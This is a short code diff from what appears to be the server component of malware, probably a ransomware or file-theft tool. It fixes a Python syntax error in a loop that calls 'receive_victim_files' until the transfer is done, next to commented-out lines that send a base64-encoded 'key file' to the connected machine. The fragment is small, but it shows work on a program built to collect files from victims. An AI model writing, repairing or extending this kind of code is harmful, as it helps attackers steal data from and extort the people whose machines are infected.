@@ -147,7 +147,7 @@ class Server:
                     #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
                     #connection.send(key)
 
-                    while !self.TRANSFER_DONE:
+                    while not self.TRANSFER_DONE:
                         self.receive_victim_files(connection)
 
                     
